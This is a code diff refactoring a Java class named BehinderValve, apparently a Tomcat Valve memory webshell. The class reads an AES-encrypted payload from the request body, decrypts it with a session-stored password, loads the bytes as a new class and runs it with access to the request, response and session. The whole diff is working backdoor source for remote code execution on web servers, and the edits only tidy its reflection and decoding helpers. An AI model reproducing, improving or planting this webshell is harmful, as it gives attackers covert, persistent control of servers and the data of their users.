@@ -38,13 +38,13 @@ public class BehinderValve extends ClassLoader implements Valve {
                 HttpSession session = request.getSession();
                 Map<String, Object> obj = new HashMap<String, Object>(3);
                 obj.put("request", request);
-                obj.put("response", unwrapResponse(response));
+                obj.put("response", unwrap(response));
                 obj.put("session", session);
                 session.setAttribute("u", pass);
                 Cipher c = Cipher.getInstance("AES");
                 c.init(2, new SecretKeySpec(pass.getBytes(), "AES"));
                 byte[] bytes = c.doFinal(base64Decode(request.getReader().readLine()));
-                Object instance = (new BehinderValve(Thread.currentThread().getContextClassLoader())).g(bytes).newInstance();
+                Object instance = (new BehinderValve(Thread.currentThread().getContextClassLoader())).defineClass(bytes, 0, bytes.length).newInstance();
                 instance.equals(obj);
                 return;
             }
@@ -55,24 +55,38 @@ public class BehinderValve extends ClassLoader implements Valve {
     }
 
     @SuppressWarnings("all")
-    public static byte[] base64Decode(String bs) throws Exception {
-        byte[] value = null;
-        Class<?> base64;
+    public Object unwrap(Object obj) {
         try {
-            base64 = Class.forName("java.util.Base64");
-            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
-            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
-        } catch (Exception var6) {
-            base64 = Class.forName("sun.misc.BASE64Decoder");
-            Object decoder = base64.newInstance();
-            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
+            return getFieldValue(obj, "response");
+        } catch (Throwable e) {
+            return obj;
         }
-        return value;
     }
 
     @SuppressWarnings("all")
-    public Class g(byte[] cb) {
-        return super.defineClass(cb, 0, cb.length);
+    public static Object getFieldValue(Object obj, String name) throws Exception {
+        Class<?> clazz = obj.getClass();
+        while (clazz != Object.class) {
+            try {
+                Field field = clazz.getDeclaredField(name);
+                field.setAccessible(true);
+                return field.get(obj);
+            } catch (NoSuchFieldException var5) {
+                clazz = clazz.getSuperclass();
+            }
+        }
+        throw new NoSuchFieldException();
+    }
+
+    @SuppressWarnings("all")
+    public static byte[] base64Decode(String bs) throws Exception {
+        try {
+            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
+        } catch (Exception var6) {
+            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
+            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
+        }
     }
 
     protected Valve next;
@@ -95,42 +109,5 @@ public class BehinderValve extends ClassLoader implements Valve {
 
     @Override
     public void backgroundProcess() {
-    }
-
-    @SuppressWarnings("all")
-    public Object unwrapResponse(Object response) {
-        Object internalResponse = response;
-        while (true) {
-            try {
-                Object r = getFieldValue(response, "response");
-                if (r == internalResponse) {
-                    return r;
-                } else {
-                    internalResponse = r;
-                }
-            } catch (Exception e) {
-                return internalResponse;
-            }
-        }
-    }
-
-    @SuppressWarnings("all")
-    public static Object getFieldValue(Object obj, String name) throws Exception {
-        Field field = null;
-        Class<?> clazz = obj.getClass();
-        while (clazz != Object.class) {
-            try {
-                field = clazz.getDeclaredField(name);
-                break;
-            } catch (NoSuchFieldException var5) {
-                clazz = clazz.getSuperclass();
-            }
-        }
-        if (field == null) {
-            throw new NoSuchFieldException(name);
-        } else {
-            field.setAccessible(true);
-            return field.get(obj);
-        }
     }
 }
